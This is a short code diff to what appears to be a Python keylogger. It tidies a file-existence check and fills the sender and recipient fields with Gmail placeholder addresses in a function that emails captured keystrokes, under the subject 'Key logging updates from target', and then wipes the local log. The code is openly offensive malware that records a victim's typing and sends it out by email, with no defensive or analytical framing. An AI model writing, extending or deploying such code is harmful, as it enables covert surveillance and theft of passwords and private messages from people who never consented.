@@ -25,7 +25,7 @@ from pynput import keyboard
 
 log_file = 'l.txt'
 file_exists = exists(log_file)
-if file_exists != True:
+if not file_exists:
     f = open(log_file, "w")
 else:
     f = open(log_file, "w")
@@ -73,8 +73,8 @@ def monitor_log_file():
             send_email(
                 subject='Key logging updates from target',
                 body=log_content,
-                to_email='RECIPIENT_EMAIL',  # Replace with your recipient email
-                from_email='SENDER_EMAIL',  # Replace with your email
+                to_email='RECIPIENT_GMAIL@gmail.com',  # Replace with your recipient email
+                from_email='SENDER_GMAIL@gmail.com',  # Replace with your email
                 password='APP_PASSWORD'  # Replace with your email password or app-specific password
             )
             open(log_file, 'w').close()
